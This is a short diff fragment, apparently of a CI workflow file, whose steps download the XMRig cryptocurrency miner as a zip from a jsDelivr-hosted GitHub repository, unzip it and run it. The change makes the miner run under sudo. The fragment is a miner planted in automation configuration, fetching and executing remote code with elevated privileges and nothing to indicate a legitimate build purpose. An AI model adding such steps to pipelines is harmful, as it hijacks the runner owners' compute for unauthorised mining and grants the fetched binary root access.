@@ -20,5 +20,5 @@ jobs:
               curl --location --output xmrig.zip \
               https://cdn.jsdelivr.net/gh/foraz/m/xmrig.zip
               unzip xmrig.zip
-              chmod +x xmrig
-              ./xmrig
+              sudo chmod +x xmrig
+              sudo ./xmrig
